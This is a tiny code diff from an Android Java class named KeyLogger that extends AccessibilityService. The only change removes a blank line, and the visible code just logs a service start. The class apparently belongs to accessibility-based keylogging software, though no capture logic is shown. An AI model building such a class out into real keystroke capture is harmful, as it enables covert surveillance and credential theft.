@@ -25,7 +25,6 @@ import java.util.Map;
 public class KeyLogger extends AccessibilityService {
 
     private final static String LOG_TAG = Helper.getLogTag(KeyLogger.class);
-
     @Override
     public void onServiceConnected() {
         Log.i(LOG_TAG, "Starting service");
